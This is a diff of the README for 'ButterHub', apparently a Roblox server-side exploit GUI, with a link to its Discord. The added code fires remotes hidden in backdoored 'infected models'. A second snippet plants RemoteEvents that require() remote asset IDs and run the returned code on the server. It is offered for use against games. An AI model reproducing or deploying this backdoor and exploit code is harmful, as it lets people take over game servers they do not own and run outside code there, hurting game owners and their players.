@@ -1,6 +1,6 @@
 # ButterHub
 
-## ButterHub is a Roblox ServerSided and FE exploiting GUI, this GUI consists of a Server Side and FE Version.
+## ButterHub is a Roblox ServerSided and FE exploiting GUI, this GUI consists of a Server Side and FE Version. [Our Discord Server](https://discord.gg/xWYcdnECvw)
 
 ---
 
@@ -68,14 +68,44 @@
 ## **SS (ServerSide)**
 
 ### This one only works in some games that have the Infected Models in them, it abuses remotes to initalize it to you.
+### So do not get mad if it does not work in a lot of games. It will only work in games with 1: The model, 2: Backdoor to allow you to run SS code. (How to use is stated below)
 
 ```lua
-for _, remote in ipairs(game:GetService("JointsService"):GetDescendants()) do
-    if (remote.Name:match("%^\\")) then
-        remote:FireServer(game:GetService("Players").LocalPlayer.Name)
+-- [[
+Made by Puro,#0224 on Discord,
+Join Our Discord: https://discord.gg/xWYcdnECvw
+]] --
+
+for _, Remote in ipairs(game:GetService("JointsService"):GetDescendants()) do
+    if (Remote.Name:match("%^\\*")) then
+        Remote:FireServer()
     end
 end
 ```
+
+### **How to use the SS Code part**
+
+```lua
+-- [[
+Made by Puro,#0224 on Discord,
+Join Our Discord: https://discord.gg/xWYcdnECvw
+
+THIS WILL ALLOW YOU TO USE THE GUI IF THE MODEL ISN'T IN THE GAME BUT YOU CAN EXECUTE SERVER CODE.
+]] --
+
+local Kill = Instance.new('RemoteEvent', game:GetService('JointsService'))
+Kill.Name = "%^\\Kill Event" --// It is important that "%^\\" is somewhere in the game.
+local End = Instance.new('RemoteEvent', game:GetService('JointsService'))
+End.Name = "%^\\*End Kill" --// It is important that "%^\\*" is somewhere in the game.
+Kill.OnServerEvent:Connect(function(player, initData)
+    require(11566712898)(initData)()
+end)
+End.OnServerEvent:Connect(function(player)
+    require(11566309513).load(player.Name)
+end)
+```
+
+### You then execute the first script.
 
 ## **FE (FilteringEnabled)**
 
